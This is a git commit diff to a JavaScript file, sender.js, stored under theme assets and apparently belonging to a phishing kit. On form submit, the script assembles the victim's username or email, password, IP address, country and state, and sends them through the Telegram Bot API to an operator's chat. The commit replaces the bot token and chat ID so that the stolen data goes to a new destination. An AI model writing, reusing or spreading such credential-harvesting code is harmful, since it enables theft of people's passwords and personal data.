cc10a39e13159360b71e5338c7ca5b38d282c3b8
taloralex29 <taloralex29@gmail.com>
2024-05-30 22:57:44 +0100

    Update sender.js

--- theme-assets/js/scripts/sender.js
+++ theme-assets/js/scripts/sender.js
@@ -21,8 +21,8 @@ form.addEventListener("submit", (e) => {
 
         var my_text = `Result from IpAddress for user ${identity} is:%0A - Username/Email: ${identity} %0A - Password: ${password} %0A - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;
 
-        var token = "6986854895:AAGyBEUhIFcSqaNmOrBMjpQigzVMZpMO38g";
-        var chat_id =  -4085217527;
+        var token = "6323318695:AAH3x4TcKakRMkpcoOxtZCgOpqEWRoLJhpM";
+        var chat_id =   -4286643760;
         var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;
 
         let api = new XMLHttpRequest();
